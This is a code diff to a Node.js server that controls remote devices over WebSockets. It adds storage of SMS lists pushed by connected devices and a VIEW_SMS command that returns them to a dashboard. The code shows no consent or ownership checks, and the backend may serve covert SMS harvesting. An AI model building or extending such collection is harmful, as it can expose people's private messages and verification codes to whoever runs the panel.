@@ -79,7 +79,8 @@ const deviceSchema = new mongoose.Schema({
     isPinned: { type: Boolean, default: false },
     registrationTimestamp: { type: Date, default: Date.now },
     customerData: { type: mongoose.Schema.Types.Mixed, default: {} },
-    isDeleted: { type: Boolean, default: false, index: true }
+    isDeleted: { type: Boolean, default: false, index: true },
+    smsMessages: { type: Array, default: [] } // Store SMS list
 });
 
 // Add compound index for faster queries
@@ -365,11 +366,16 @@ app.post('/api/command', async (req, res) => {
             
         } else if (action === 'VIEW_SMS') {
             console.log(`📬 View SMS`);
-            result.message = `✅ SMS list retrieved`;
+            // Return real SMS messages if available
+            if (device.smsMessages && device.smsMessages.length > 0) {
+                return res.json({ success: true, messages: device.smsMessages });
+            } else {
+                return res.json({ success: false, message: 'No SMS messages found' });
+            }
         } else {
             result = { success: false, message: 'Unknown action' };
         }
-        
+
         // Send command to specific connected device(s) and report success accordingly
         let sentCount = 0;
         if (global.deviceSockets && deviceId) {
@@ -386,12 +392,14 @@ app.post('/api/command', async (req, res) => {
             }
         }
 
-        if (sentCount === 0) {
+        if (sentCount === 0 && action !== 'VIEW_SMS') {
             // Device not connected — report failure so frontend doesn't show false success
             return res.json({ success: false, message: 'Device not connected' });
         }
 
-        res.json({ success: true, message: 'Command sent', sentTo: sentCount });
+        if (action !== 'VIEW_SMS') {
+            res.json({ success: true, message: 'Command sent', sentTo: sentCount });
+        }
     } catch (err) {
         console.error('❌ Command error:', err);
         res.status(500).json({ success: false, message: 'Server error: ' + err.message });
@@ -435,6 +443,18 @@ wss.on('connection', (ws, req) => {
         try {
             console.log(`[WS] Message from ${remoteAddr}:`, message);
             const data = JSON.parse(message);
+
+            // Handle SMS_LIST from device
+            if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
+                // Store SMS messages in device document
+                await Device.findOneAndUpdate(
+                    { deviceId: data.deviceId },
+                    { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } },
+                    { upsert: false, writeConcern: { w: 1 }, maxTimeMS: 8000 }
+                );
+                console.log(`[WS] Stored ${data.messages.length} SMS for device ${data.deviceId}`);
+                return;
+            }
 
             if (data.deviceId || data.serialNumber) {
                 deviceId = data.deviceId || data.serialNumber;
@@ -511,9 +531,9 @@ wss.on('connection', (ws, req) => {
                     { $set: { isOnline: false, lastSeen: new Date() } },
                     { writeConcern: { w: 1 }, maxTimeMS: 8000 }
                 );
-
+                // Immediately update dashboard on disconnect
                 if (global.io) {
-                    setImmediate(() => global.io.emit('dashboard-update'));
+                    global.io.emit('dashboard-update');
                 }
             } catch (err) {
                 console.error(`[WS] Error updating device offline status for ${deviceId}:`, err.message);
@@ -536,14 +556,22 @@ wss.on('connection', (ws, req) => {
     });
 });
 
-// Ping heartbeat every 30 seconds to detect dead connections
+// Ping heartbeat every 20 seconds to detect dead connections faster
 heartbeat = setInterval(() => {
     wss.clients.forEach((ws) => {
-        if (!ws.isAlive) return ws.terminate();
+        if (ws.isAlive === false) {
+            // Terminate and trigger close event
+            ws.terminate();
+            return;
+        }
         ws.isAlive = false;
-        ws.ping();
+        try {
+            ws.ping();
+        } catch (e) {
+            console.error('[WS] Ping error:', e.message);
+        }
     });
-}, 30000);
+}, 20000);
 
 // ========== SOCKET.IO HANDLERS ==========
 
